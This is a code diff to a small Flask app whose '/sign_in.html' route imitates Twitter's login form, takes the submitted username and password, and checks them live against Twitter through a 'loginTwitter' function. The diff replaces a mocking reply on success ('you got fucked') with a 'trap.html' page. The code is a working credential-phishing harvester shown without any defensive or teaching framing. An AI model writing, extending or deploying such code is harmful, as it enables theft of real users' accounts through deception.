@@ -10,15 +10,13 @@ def index():
 
 @app.route('/sign_in.html', methods=['GET', 'POST'])
 def load():
-	#url_for('static', filename='logo.png')
 	if request.method == 'POST':
 		username = request.form['session[username_or_email]']
 		password = request.form['session[password]']
 		if loginTwitter(username, password) == True:
-			return 'you got fucked'
+			return render_template('trap.html', name=None)
 		else:
-			return 'wrong password'
-
+			return render_template('wrong_password.html', name=None)
 	else:
 		return render_template('sign_in.html', name=None)
 
